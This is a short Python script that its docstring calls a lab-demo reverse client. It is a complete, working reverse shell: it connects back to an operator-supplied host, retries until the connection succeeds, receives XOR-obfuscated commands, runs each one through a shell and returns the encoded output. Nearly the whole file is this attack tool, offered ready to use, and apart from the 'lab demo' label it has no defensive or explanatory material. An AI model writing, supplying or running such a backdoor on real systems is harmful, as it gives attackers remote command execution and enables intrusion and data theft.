#!/usr/bin/env python3
"""
Minimal reverse client for lab demo. Usage: python3 revshell_client.py <host> <port> <passphrase>
"""
import socket, sys, subprocess, os, time

HOST = sys.argv[1]
PORT = int(sys.argv[2])
PASS = sys.argv[3].encode()

def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])

while True:
    try:
        s = socket.socket()
        s.connect((HOST, PORT))
        break
    except Exception:
        time.sleep(2)

while True:
    data = s.recv(65536)
    if not data:
        break
    cmd = xor(data, PASS).decode(errors='ignore').strip()
    if cmd in ("exit","quit"):
        break
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except Exception as e:
        out = str(e).encode()
    s.send(xor(out, PASS))
s.close()
